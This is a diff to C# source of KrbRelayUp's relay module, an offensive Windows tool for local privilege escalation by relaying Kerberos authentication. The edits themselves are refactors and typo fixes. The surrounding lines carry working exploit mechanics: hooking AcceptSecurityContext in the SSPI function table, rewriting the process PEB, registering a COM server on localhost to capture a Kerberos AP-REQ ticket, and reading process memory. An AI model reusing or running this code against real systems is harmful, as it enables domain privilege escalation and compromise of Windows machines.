@@ -8,7 +8,6 @@ using System.Net;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading.Tasks;
 using static KrbRelayUp.Relay.Natives;
 
 namespace KrbRelayUp.Relay
@@ -18,9 +17,9 @@ namespace KrbRelayUp.Relay
         public static Guid clsId_guid = new Guid("90f18417-f0f1-484e-9d3c-59dceee5dbd8");
         public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
         public static IntPtr ld = IntPtr.Zero;
-        public static byte[] apRep1 = new byte[] { };
-        public static byte[] apRep2 = new byte[] { };
-        public static byte[] ticket = new byte[] { };
+        public static byte[] apRep1 = { };
+        public static byte[] apRep2 = { };
+        public static byte[] ticket = { };
         public static string spn = "";
         public static string relayedUser = "";
         public static string relayedUserDomain = "";
@@ -30,7 +29,6 @@ namespace KrbRelayUp.Relay
         public static bool useSSL = false;
         public static string sid = "";
         public static string port = "";
-
 
         public static void Run(string aDomain, string aDomainController, string aComputerSid, string aPort="12345")
         {
@@ -105,15 +103,16 @@ namespace KrbRelayUp.Relay
             AcceptSecurityContextFunc AcceptSecurityContextDeleg = new AcceptSecurityContextFunc(AcceptSecurityContext_);
             byte[] bAcceptSecurityContext = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(AcceptSecurityContextDeleg).ToInt64());
             int oAcceptSecurityContext = Marshal.OffsetOf(typeof(SecurityFunctionTable), "AcceptSecurityContex").ToInt32();
-            Marshal.Copy(bAcceptSecurityContext, 0, (IntPtr)functionTable + oAcceptSecurityContext, bAcceptSecurityContext.Length);
+            Marshal.Copy(bAcceptSecurityContext, 0, functionTable + oAcceptSecurityContext, bAcceptSecurityContext.Length);
             //get new value
             table = (SecurityFunctionTable)Marshal.PtrToStructure(functionTable, typeof(SecurityFunctionTable));
             //Console.WriteLine("[*] New AcceptSecurityContex: {0}", table.AcceptSecurityContex);
 
             Console.WriteLine("[+] Rewriting PEB");
             //Init RPC server
-            var svcs = new SOLE_AUTHENTICATION_SERVICE[] {
-                new SOLE_AUTHENTICATION_SERVICE() {
+            var svcs = new[] {
+                new SOLE_AUTHENTICATION_SERVICE
+                {
                     dwAuthnSvc = 16, // HKLM\SOFTWARE\Microsoft\Rpc\SecurityService sspicli.dll
                     pPrincipalName = spn
                 }
@@ -143,11 +142,11 @@ namespace KrbRelayUp.Relay
             if (!checkPort(int.Parse(port)))
             {
                 Console.WriteLine("[+] Looking for available ports..");
-                port = checkPorts(new string[] { "SYSTEM" }).ToString();
+                port = checkPorts(new[] { "SYSTEM" }).ToString();
                 if (port == "-1")
                 {
                     Console.WriteLine("[-] No available ports found");
-                    Console.WriteLine("[-] Firwall will block our COM connection. Exiting");
+                    Console.WriteLine("[-] Firewall will block our COM connection. Exiting");
                     return;
                 }
                 Console.WriteLine("[+] Port {0} available", port);
@@ -156,7 +155,7 @@ namespace KrbRelayUp.Relay
             //COM object
             Console.WriteLine("[+] Register COM server");
             byte[] ba = ComUtils.GetMarshalledObject(new object());
-            COMObjRefStandard std = (COMObjRefStandard)COMObjRefStandard.FromArray(ba);
+            COMObjRefStandard std = (COMObjRefStandard)COMObjRef.FromArray(ba);
 
             std.StringBindings.Clear();
             std.StringBindings.Add(new COMStringBinding(RpcTowerId.Tcp, "127.0.0.1"));
@@ -188,7 +187,6 @@ namespace KrbRelayUp.Relay
             }
         }
 
-
         [STAThread]
         public static SecStatusCode AcceptSecurityContext_([In] SecHandle phCredential, [In] SecHandle phContext, [In] SecurityBufferDescriptor pInput, AcceptContextReqFlags fContextReq, SecDataRep TargetDataRep, [In, Out] SecHandle phNewContext, [In, Out] IntPtr pOutput, out AcceptContextRetFlags pfContextAttr, [Out] SECURITY_INTEGER ptsExpiry)
         {
@@ -202,7 +200,7 @@ namespace KrbRelayUp.Relay
                 ticket = Helpers.ConvertApReq(ticket);
                 if (ticket[0] != 0x60)
                 {
-                    Console.WriteLine("[-] Recieved invalid apReq, exploit will fail");
+                    Console.WriteLine("[-] Received invalid apReq, exploit will fail");
                     Console.WriteLine("{0}", Helpers.ByteArrayToString(ticket));
                     Environment.Exit(0);
                 }
@@ -246,12 +244,11 @@ namespace KrbRelayUp.Relay
             {
                 byte[] nbytes = new byte[254];
                 Marshal.Copy(apRep1, 0, ogSecBuffer.Token + 116, apRep1.Length); // verify this 116 offset?
-                Marshal.Copy(nbytes, 0, (IntPtr)ogSecBuffer.Token + apRep1.Length + 116, nbytes.Length);
+                Marshal.Copy(nbytes, 0, ogSecBuffer.Token + apRep1.Length + 116, nbytes.Length);
             }
 
             return ret;
         }
-
 
         public static void setUserData()
         {
@@ -270,7 +267,7 @@ namespace KrbRelayUp.Relay
             NtQueryInformationProcess(hProcess, 0, ref pbi, Marshal.SizeOf(pbi), ref RetLen);
 
             //https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters
-            IntPtr pProcessParametersOffset = (IntPtr)(pbi.PebBaseAddress + 0x20);
+            IntPtr pProcessParametersOffset = pbi.PebBaseAddress + 0x20;
             byte[] addrBuf = new byte[IntPtr.Size];
             ReadProcessMemory(hProcess, pProcessParametersOffset, addrBuf, addrBuf.Length, out temp);
             IntPtr processParametersOffset = (IntPtr)BitConverter.ToInt64(addrBuf, 0);
